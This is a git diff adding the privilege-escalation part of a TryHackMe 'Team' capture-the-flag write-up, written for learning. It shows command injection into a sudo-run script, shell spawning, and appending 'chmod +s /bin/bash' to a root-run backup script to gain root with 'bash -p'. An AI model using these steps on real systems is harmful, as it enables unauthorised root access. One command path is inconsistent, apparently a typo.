@@ -127,4 +127,46 @@ uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip
 Starting privilege escalation, we do simple sudo -l to see which commands we can run as different users and look at what the script does.
 ![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/Team/images/ssh_sudo-l.png?raw=true)
 
-If you don't know what any of these commands do u can use linux documentation. What read does here is putting 
+If you don't know what any of these commands do u can use linux documentation. What read does here is putting out input into error
+variable and then putting it straight into bash. This leads to command execution with simple /bin/bash.
+
+```
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: whatever
+Enter 'date' to timestamp the file: /bin/bash
+The Date is 
+id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+gyles@TEAM:~$ id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
+```
+Now we're user gyles. Let's look into gyles directory. There is a .bash_history file which we can read. If you look
+closely through the file there is a /usr/local/bin/main_backup.sh file which belongs to the admin group and is owned by root. There is no cronjob that we can see but it's still worth the try. The easiest way to privesc from here is to change /bin/bash permissions so it runs with the owner's (root) permissions.
+
+```
+gyles@TEAM:/home/gyles$ echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.s
+gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
+#!/bin/bash
+cp -r /var/www/team.thm/* /var/backups/www/team.thm/
+chmod +s /bin/bash
+```
+Now we wait a until the minute passes and do
+```
+gyles@TEAM:/home/gyles$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
+```
+If you want to keep the permissions and escalate to the root user u need to run it with -p otherwise it won't keep the permissions.
+```
+gyles@TEAM:/home/gyles$ /bin/bash -p
+bash-4.4# id
+uid=1001(gyles) gid=1001(gyles) euid=0(root) egid=0(root) groups=0(root),1001(gyles),1003(editors),1004(admin)
+bash-4.4# cat /root/root.txt
+THM{fhqbz*******}
+```
+And we have successfully rooted this machine and got the root flag.
+Thank you so much for reading this write up. If you have any suggestions, questions or just want to play CTFs with someone reach me out 
+on Twitter or wherever else you can find me.
+
